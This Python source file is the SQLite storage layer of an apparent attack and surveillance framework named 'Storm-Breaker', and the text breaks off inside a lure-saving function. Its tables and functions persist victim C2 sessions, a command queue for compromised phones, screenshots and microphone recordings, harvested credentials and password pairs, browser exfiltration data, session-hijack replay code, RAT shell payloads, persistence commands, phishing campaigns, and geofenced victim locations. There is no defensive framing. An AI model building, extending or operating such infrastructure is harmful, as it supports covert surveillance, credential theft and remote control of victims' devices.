"""
Storm-Breaker Database Module
Provides persistent storage for victim sessions
"""

import sqlite3
import json
from datetime import datetime
import os

DB_PATH = os.path.join(os.path.dirname(__file__), 'storm_breaker.db')

def init_database():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Mobile Sessions Table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_sessions (
            uid TEXT PRIMARY KEY,
            info TEXT,
            ip TEXT,
            last_seen TEXT,
            registered_at TEXT,
            first_seen TEXT
        )
    ''')
    
    # C2 Sessions Table (for desktop victims)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS c2_sessions (
            uid TEXT PRIMARY KEY,
            info TEXT,
            ip TEXT,
            last_seen TEXT,
            registered_at TEXT,
            first_seen TEXT
        )
    ''')
    
    # Mobile Commands Queue
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            command TEXT,
            timestamp TEXT,
            executed INTEGER DEFAULT 0
        )
    ''')
    
    # Mobile Responses Queue
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_responses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            output TEXT,
            timestamp TEXT,
            retrieved INTEGER DEFAULT 0
        )
    ''')
    
    # Tracking Data
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracking_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            data TEXT,
            timestamp TEXT
        )
    ''')

    # Mobile Media Captures (screenshots, microphone audio, screen recordings)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            capture_type TEXT,
            filename TEXT,
            url TEXT,
            meta TEXT DEFAULT '{}',
            timestamp TEXT
        )
    ''')

    # Campaigns Table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            template TEXT,
            description TEXT,
            callback_url TEXT,
            status TEXT DEFAULT 'active',
            created_at TEXT,
            updated_at TEXT,
            stats TEXT DEFAULT '{}'
        )
    ''')

    # Campaign Tracking Links
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS campaign_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER,
            link_code TEXT UNIQUE,
            target_url TEXT,
            clicks INTEGER DEFAULT 0,
            captures INTEGER DEFAULT 0,
            created_at TEXT,
            FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
        )
    ''')

    # Credentials Store
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cred_type TEXT,
            value TEXT,
            source TEXT,
            source_file TEXT,
            ip TEXT,
            paired_username TEXT,
            paired_password TEXT,
            url TEXT,
            confidence INTEGER DEFAULT 50,
            discovered_at TEXT
        )
    ''')

    # Victim Profiles (auto-correlated)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victim_profiles (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            fingerprint_hash TEXT,
            user_agent TEXT,
            platform TEXT,
            browser TEXT,
            screen_res TEXT,
            location_lat REAL,
            location_lon REAL,
            first_seen TEXT,
            last_seen TEXT,
            tags TEXT DEFAULT '[]',
            notes TEXT DEFAULT '',
            risk_score INTEGER DEFAULT 0,
            sessions TEXT DEFAULT '[]',
            credentials TEXT DEFAULT '[]',
            data TEXT DEFAULT '{}'
        )
    ''')

    # Geofences
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS geofences (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            lat REAL,
            lon REAL,
            radius_km REAL DEFAULT 1.0,
            alert_type TEXT DEFAULT 'notify',
            active INTEGER DEFAULT 1,
            created_at TEXT,
            triggered_count INTEGER DEFAULT 0
        )
    ''')

    # Operator Activity Log
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS operator_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            operator TEXT,
            action TEXT,
            details TEXT,
            ip TEXT,
            timestamp TEXT
        )
    ''')

    # Reports Table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            report_type TEXT DEFAULT 'full',
            config TEXT DEFAULT '{}',
            html_content TEXT,
            stats TEXT DEFAULT '{}',
            generated_at TEXT
        )
    ''')

    # Playbooks Table (automated multi-step attack workflows)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS playbooks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT DEFAULT '',
            steps TEXT DEFAULT '[]',
            status TEXT DEFAULT 'draft',
            variables TEXT DEFAULT '{}',
            execution_log TEXT DEFAULT '[]',
            created_at TEXT,
            last_run TEXT,
            run_count INTEGER DEFAULT 0
        )
    ''')

    # Lure Templates (saved custom lures)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS saved_lures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            category TEXT,
            lure_type TEXT DEFAULT 'email',
            subject TEXT,
            body TEXT,
            variables TEXT DEFAULT '{}',
            created_at TEXT,
            use_count INTEGER DEFAULT 0
        )
    ''')

    # Network Discovery Results
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS network_discoveries (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_ip TEXT,
            scan_type TEXT,
            discovered_hosts TEXT DEFAULT '[]',
            ports TEXT DEFAULT '[]',
            services TEXT DEFAULT '[]',
            raw_data TEXT DEFAULT '{}',
            timestamp TEXT
        )
    ''')

    # Browser Exfiltration Data
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS browser_exfil (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_ip TEXT,
            session_id TEXT,
            data_type TEXT,
            data TEXT,
            metadata TEXT DEFAULT '{}',
            timestamp TEXT
        )
    ''')

    # Evasion Configurations
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS evasion_configs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            config TEXT,
            stealth_score INTEGER DEFAULT 0,
            stealth_grade TEXT DEFAULT 'C',
            traffic_profile TEXT,
            timing_profile TEXT,
            created_by TEXT,
            created_at TEXT,
            last_used TEXT
        )
    ''')

    # Threat Intelligence Records
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS threat_intel (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            intel_type TEXT,
            target TEXT,
            result TEXT,
            threat_score INTEGER DEFAULT 0,
            threat_level TEXT DEFAULT 'none',
            created_by TEXT,
            created_at TEXT
        )
    ''')

    # Session Hijack Records
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS session_hijacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_ip TEXT,
            session_data TEXT,
            token_count INTEGER DEFAULT 0,
            critical_tokens INTEGER DEFAULT 0,
            hijack_feasibility TEXT DEFAULT 'unknown',
            risk_score INTEGER DEFAULT 0,
            replay_code TEXT,
            created_at TEXT
        )
    ''')

    # Pivot Records (attack graphs, kill chain)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pivot_records (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            record_type TEXT,
            name TEXT,
            data TEXT,
            host_count INTEGER DEFAULT 0,
            path_count INTEGER DEFAULT 0,
            kill_chain_coverage INTEGER DEFAULT 0,
            created_by TEXT,
            created_at TEXT
        )
    ''')

    # RAT Operations Log
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS rat_operations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            operation_type TEXT NOT NULL,
            name TEXT,
            target_os TEXT DEFAULT 'windows',
            parameters TEXT DEFAULT '{}',
            result TEXT DEFAULT '{}',
            risk_level TEXT DEFAULT 'medium',
            mitre_id TEXT,
            created_by TEXT DEFAULT 'operator',
            created_at TEXT
        )
    ''')

    # RAT Shell Sessions
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS rat_shell_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_name TEXT,
            shell_type TEXT,
            lhost TEXT,
            lport TEXT,
            target_host TEXT,
            status TEXT DEFAULT 'generated',
            payload TEXT,
            encoding TEXT,
            created_at TEXT,
            last_used TEXT
        )
    ''')

    # RAT Persistence Records
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS rat_persistence (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_os TEXT,
            method TEXT,
            install_cmd TEXT,
            cleanup_cmd TEXT,
            risk_level TEXT,
            survival TEXT,
            status TEXT DEFAULT 'generated',
            created_at TEXT
        )
    ''')

    conn.commit()
    conn.close()

# ===== MOBILE SESSIONS =====

def save_mobile_session(uid, info, ip):
    """Save or update a mobile session"""
    if not uid:
        # A session without a uid is unusable and corrupts the client list
        return

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    
    # Check if session exists
    cursor.execute('SELECT uid, first_seen FROM mobile_sessions WHERE uid = ?', (uid,))
    existing = cursor.fetchone()
    
    if existing:
        # Update existing session
        cursor.execute('''
            UPDATE mobile_sessions 
            SET info = ?, ip = ?, last_seen = ?, registered_at = ?
            WHERE uid = ?
        ''', (json.dumps(info), ip, now, now, uid))
    else:
        # Insert new session
        cursor.execute('''
            INSERT INTO mobile_sessions (uid, info, ip, last_seen, registered_at, first_seen)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (uid, json.dumps(info), ip, now, now, now))
    
    conn.commit()
    conn.close()

def get_mobile_session(uid):
    """Get a specific mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM mobile_sessions WHERE uid = ?', (uid,))
    row = cursor.fetchone()
    conn.close()
    
    if row:
        return {
            'uid': row[0],
            'info': json.loads(row[1]) if row[1] else {},
            'ip': row[2],
            'last_seen': row[3],
            'registered_at': row[4],
            'first_seen': row[5]
        }
    return None

def get_all_mobile_sessions():
    """Get all mobile sessions"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM mobile_sessions ORDER BY last_seen DESC')
    rows = cursor.fetchall()
    conn.close()
    
    sessions = {}
    for row in rows:
        if not row[0]:
            # Skip legacy/corrupt rows with no uid
            continue
        sessions[row[0]] = {
            'uid': row[0],
            'info': json.loads(row[1]) if row[1] else {},
            'ip': row[2],
            'last_seen': row[3],
            'registered_at': row[4],
            'first_seen': row[5]
        }
    
    return sessions

def update_mobile_last_seen(uid):
    """Update last seen timestamp for a mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('UPDATE mobile_sessions SET last_seen = ? WHERE uid = ?', (now, uid))
    
    conn.commit()
    conn.close()

def delete_mobile_session(uid):
    """Delete a mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('DELETE FROM mobile_sessions WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM mobile_commands WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM mobile_responses WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM tracking_data WHERE uid = ?', (uid,))
    
    conn.commit()
    conn.close()


# ===== C2 SESSIONS =====

def save_c2_session(uid, info, ip):
    """Save or update a desktop C2 session"""
    if not uid:
        return

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    now = datetime.now().isoformat()

    cursor.execute('SELECT uid, first_seen FROM c2_sessions WHERE uid = ?', (uid,))
    existing = cursor.fetchone()

    if existing:
        cursor.execute('''
            UPDATE c2_sessions
            SET info = ?, ip = ?, last_seen = ?, registered_at = ?
            WHERE uid = ?
        ''', (json.dumps(info), ip, now, now, uid))
    else:
        cursor.execute('''
            INSERT INTO c2_sessions (uid, info, ip, last_seen, registered_at, first_seen)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (uid, json.dumps(info), ip, now, now, now))

    conn.commit()
    conn.close()


def update_c2_last_seen(uid):
    """Update the last seen timestamp for a desktop C2 session"""
    if not uid:
        return

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    now = datetime.now().isoformat()
    cursor.execute('UPDATE c2_sessions SET last_seen = ? WHERE uid = ?', (now, uid))

    conn.commit()
    conn.close()


def get_all_c2_sessions():
    """Get all persisted desktop C2 sessions"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute('SELECT * FROM c2_sessions ORDER BY last_seen DESC')
    rows = cursor.fetchall()
    conn.close()

    sessions = {}
    for row in rows:
        if not row[0]:
            continue
        sessions[row[0]] = {
            'uid': row[0],
            'info': json.loads(row[1]) if row[1] else {},
            'ip': row[2],
            'last_seen': row[3],
            'registered_at': row[4],
            'first_seen': row[5]
        }

    return sessions


# ===== MOBILE MEDIA CAPTURES =====

def save_mobile_capture(uid, capture_type, filename, url, meta=None):
    """Persist a mobile media capture (screenshot / audio / screen recording)"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO mobile_captures (uid, capture_type, filename, url, meta, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (uid, capture_type, filename, url, json.dumps(meta or {}), now))

    conn.commit()
    conn.close()
    return now


def get_mobile_captures(uid=None, limit=200):
    """Get mobile media captures, newest first. Optionally filtered by uid."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    if uid:
        cursor.execute(
            'SELECT * FROM mobile_captures WHERE uid = ? ORDER BY id DESC LIMIT ?',
            (uid, limit)
        )
    else:
        cursor.execute('SELECT * FROM mobile_captures ORDER BY id DESC LIMIT ?', (limit,))

    rows = cursor.fetchall()
    conn.close()

    captures = []
    for row in rows:
        captures.append({
            'id': row[0],
            'uid': row[1],
            'type': row[2],
            'filename': row[3],
            'url': row[4],
            'meta': json.loads(row[5]) if row[5] else {},
            'timestamp': row[6]
        })
    return captures

# ===== MOBILE COMMANDS =====

def add_mobile_command(uid, command):
    """Add a command to the queue"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO mobile_commands (uid, command, timestamp, executed)
        VALUES (?, ?, ?, 0)
    ''', (uid, command, now))
    
    conn.commit()
    conn.close()

def get_mobile_commands(uid):
    """Get pending commands for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, command FROM mobile_commands 
        WHERE uid = ? AND executed = 0 
        ORDER BY id ASC
    ''', (uid,))
    
    rows = cursor.fetchall()
    conn.close()
    
    return rows

def mark_command_executed(command_id):
    """Mark a command as executed"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('UPDATE mobile_commands SET executed = 1 WHERE id = ?', (command_id,))
    
    conn.commit()
    conn.close()

# ===== MOBILE RESPONSES =====

def add_mobile_response(uid, output):
    """Add a response to the queue"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO mobile_responses (uid, output, timestamp, retrieved)
        VALUES (?, ?, ?, 0)
    ''', (uid, output, now))
    
    conn.commit()
    conn.close()

def get_mobile_response(uid):
    """Get the oldest unread response for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, output FROM mobile_responses 
        WHERE uid = ? AND retrieved = 0 
        ORDER BY id ASC 
        LIMIT 1
    ''', (uid,))
    
    row = cursor.fetchone()
    
    if row:
        # Mark as retrieved
        cursor.execute('UPDATE mobile_responses SET retrieved = 1 WHERE id = ?', (row[0],))
        conn.commit()
        conn.close()
        return row[1]
    
    conn.close()
    return None

# ===== TRACKING DATA =====

def add_tracking_data(uid, data):
    """Add tracking data"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO tracking_data (uid, data, timestamp)
        VALUES (?, ?, ?)
    ''', (uid, json.dumps(data), now))
    
    conn.commit()
    conn.close()

def get_tracking_data(uid, limit=100):
    """Get tracking data for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT data, timestamp FROM tracking_data 
        WHERE uid = ? 
        ORDER BY id DESC 
        LIMIT ?
    ''', (uid, limit))
    
    rows = cursor.fetchall()
    conn.close()
    
    return [{'data': json.loads(row[0]), 'timestamp': row[1]} for row in rows]

# ===== CLEANUP =====

def cleanup_old_data(days=30):
    """Clean up data older than specified days"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    from datetime import timedelta
    cutoff = (datetime.now() - timedelta(days=days)).isoformat()
    
    cursor.execute('DELETE FROM mobile_commands WHERE timestamp < ? AND executed = 1', (cutoff,))
    cursor.execute('DELETE FROM mobile_responses WHERE timestamp < ? AND retrieved = 1', (cutoff,))
    cursor.execute('DELETE FROM tracking_data WHERE timestamp < ?', (cutoff,))
    
    conn.commit()
    conn.close()

# Initialize database on import
init_database()


# ===== CAMPAIGNS =====

def create_campaign(name, template, description='', callback_url=''):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO campaigns (name, template, description, callback_url, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (name, template, description, callback_url, now, now))
    campaign_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return campaign_id


def get_campaigns():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM campaigns ORDER BY created_at DESC')
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_campaign(campaign_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM campaigns WHERE id = ?', (campaign_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None


def update_campaign(campaign_id, **kwargs):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    kwargs['updated_at'] = datetime.now().isoformat()
    sets = ', '.join([f'{k} = ?' for k in kwargs.keys()])
    cursor.execute(f'UPDATE campaigns SET {sets} WHERE id = ?', list(kwargs.values()) + [campaign_id])
    conn.commit()
    conn.close()


def delete_campaign(campaign_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM campaigns WHERE id = ?', (campaign_id,))
    cursor.execute('DELETE FROM campaign_links WHERE campaign_id = ?', (campaign_id,))
    conn.commit()
    conn.close()


def add_campaign_link(campaign_id, link_code, target_url):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO campaign_links (campaign_id, link_code, target_url, created_at)
        VALUES (?, ?, ?, ?)
    ''', (campaign_id, link_code, target_url, now))
    conn.commit()
    conn.close()


def get_campaign_links(campaign_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM campaign_links WHERE campaign_id = ?', (campaign_id,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def increment_campaign_click(link_code):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE campaign_links SET clicks = clicks + 1 WHERE link_code = ?', (link_code,))
    conn.commit()
    conn.close()


def increment_campaign_capture(link_code):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE campaign_links SET captures = captures + 1 WHERE link_code = ?', (link_code,))
    conn.commit()
    conn.close()


# ===== CREDENTIALS =====

def save_credential(cred_type, value, source, source_file='', ip='', url='', confidence=50, paired_username='', paired_password=''):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    # Check for duplicate
    cursor.execute('SELECT id FROM credentials WHERE cred_type = ? AND value = ?', (cred_type, value))
    if cursor.fetchone():
        conn.close()
        return None
    cursor.execute('''
        INSERT INTO credentials (cred_type, value, source, source_file, ip, url, confidence, paired_username, paired_password, discovered_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (cred_type, value, source, source_file, ip, url, confidence, paired_username, paired_password, now))
    cred_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return cred_id


def get_credentials(cred_type=None, limit=200):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    if cred_type:
        cursor.execute('SELECT * FROM credentials WHERE cred_type = ? ORDER BY discovered_at DESC LIMIT ?', (cred_type, limit))
    else:
        cursor.execute('SELECT * FROM credentials ORDER BY discovered_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_credential_pairs():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credentials WHERE paired_username != '' AND paired_password != '' ORDER BY discovered_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_credential(cred_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM credentials WHERE id = ?', (cred_id,))
    conn.commit()
    conn.close()


# ===== VICTIM PROFILES =====

def save_victim_profile(ip, fingerprint_hash='', user_agent='', platform_name='', browser='', screen_res='', lat=None, lon=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    # Check if profile exists for this IP
    cursor.execute('SELECT id FROM victim_profiles WHERE ip = ?', (ip,))
    existing = cursor.fetchone()
    if existing:
        cursor.execute('''
            UPDATE victim_profiles SET fingerprint_hash = COALESCE(NULLIF(?, ''), fingerprint_hash),
            user_agent = COALESCE(NULLIF(?, ''), user_agent),
            platform = COALESCE(NULLIF(?, ''), platform),
            browser = COALESCE(NULLIF(?, ''), browser),
            screen_res = COALESCE(NULLIF(?, ''), screen_res),
            location_lat = COALESCE(?, location_lat),
            location_lon = COALESCE(?, location_lon),
            last_seen = ?
            WHERE id = ?
        ''', (fingerprint_hash, user_agent, platform_name, browser, screen_res, lat, lon, now, existing[0]))
        profile_id = existing[0]
    else:
        cursor.execute('''
            INSERT INTO victim_profiles (ip, fingerprint_hash, user_agent, platform, browser, screen_res, location_lat, location_lon, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (ip, fingerprint_hash, user_agent, platform_name, browser, screen_res, lat, lon, now, now))
        profile_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return profile_id


def get_victim_profiles(limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victim_profiles ORDER BY last_seen DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_victim_profile(profile_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM victim_profiles WHERE id = ?', (profile_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None


def update_victim_tags(profile_id, tags):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE victim_profiles SET tags = ? WHERE id = ?', (json.dumps(tags), profile_id))
    conn.commit()
    conn.close()


def update_victim_notes(profile_id, notes):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE victim_profiles SET notes = ? WHERE id = ?', (notes, profile_id))
    conn.commit()
    conn.close()


def update_victim_risk_score(profile_id, score):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE victim_profiles SET risk_score = ? WHERE id = ?', (score, profile_id))
    conn.commit()
    conn.close()


# ===== GEOFENCES =====

def create_geofence(name, lat, lon, radius_km=1.0, alert_type='notify'):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO geofences (name, lat, lon, radius_km, alert_type, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (name, lat, lon, radius_km, alert_type, now))
    fence_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return fence_id


def get_geofences():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM geofences ORDER BY created_at DESC')
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def delete_geofence(fence_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM geofences WHERE id = ?', (fence_id,))
    conn.commit()
    conn.close()


def check_geofence(lat, lon):
    """Check if coordinates are within any geofence"""
    import math
    fences = get_geofences()
    triggered = []
    for fence in fences:
        if not fence.get('active'):
            continue
        # Haversine distance
        R = 6371  # Earth radius in km
        dlat = math.radians(lat - fence['lat'])
        dlon = math.radians(lon - fence['lon'])
        a = math.sin(dlat/2)**2 + math.cos(math.radians(fence['lat'])) * math.cos(math.radians(lat)) * math.sin(dlon/2)**2
        c = 2 * math.asin(math.sqrt(a))
        distance = R * c
        if distance <= fence['radius_km']:
            triggered.append({
                'fence': fence,
                'distance_km': round(distance, 3)
            })
            # Increment trigger count
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('UPDATE geofences SET triggered_count = triggered_count + 1 WHERE id = ?', (fence['id'],))
            conn.commit()
            conn.close()
    return triggered


# ===== OPERATOR LOG =====

def log_operator_action(operator, action, details='', ip=''):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO operator_log (operator, action, details, ip, timestamp)
        VALUES (?, ?, ?, ?, ?)
    ''', (operator, action, details, ip, now))
    conn.commit()
    conn.close()


def get_operator_log(limit=100):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM operator_log ORDER BY timestamp DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


# ===== REPORTS =====

def save_report(name, report_type, config, html_content, stats):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO reports (name, report_type, config, html_content, stats, generated_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (name, report_type, json.dumps(config), html_content, json.dumps(stats), now))
    report_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return report_id


def get_reports(limit=50):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT id, name, report_type, config, stats, generated_at FROM reports ORDER BY generated_at DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_report(report_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM reports WHERE id = ?', (report_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None


def delete_report(report_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM reports WHERE id = ?', (report_id,))
    conn.commit()
    conn.close()


# ===== PLAYBOOKS =====

def save_playbook(name, description, steps, variables=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO playbooks (name, description, steps, variables, created_at)
        VALUES (?, ?, ?, ?, ?)
    ''', (name, description, json.dumps(steps), json.dumps(variables or {}), now))
    pb_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return pb_id


def get_playbooks():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM playbooks ORDER BY created_at DESC')
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_playbook(pb_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM playbooks WHERE id = ?', (pb_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None


def update_playbook(pb_id, **kwargs):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    sets = []
    vals = []
    for k, v in kwargs.items():
        if k in ('name', 'description', 'steps', 'status', 'variables', 'execution_log', 'last_run', 'run_count'):
            sets.append(f'{k} = ?')
            vals.append(json.dumps(v) if isinstance(v, (dict, list)) else v)
    if sets:
        vals.append(pb_id)
        cursor.execute(f'UPDATE playbooks SET {", ".join(sets)} WHERE id = ?', vals)
        conn.commit()
    conn.close()


def delete_playbook(pb_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM playbooks WHERE id = ?', (pb_id,))
    conn.commit()
    conn.close()


# ===== SAVED LURES =====

def save_lure(name, category, lure_type, subject, body, variables=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
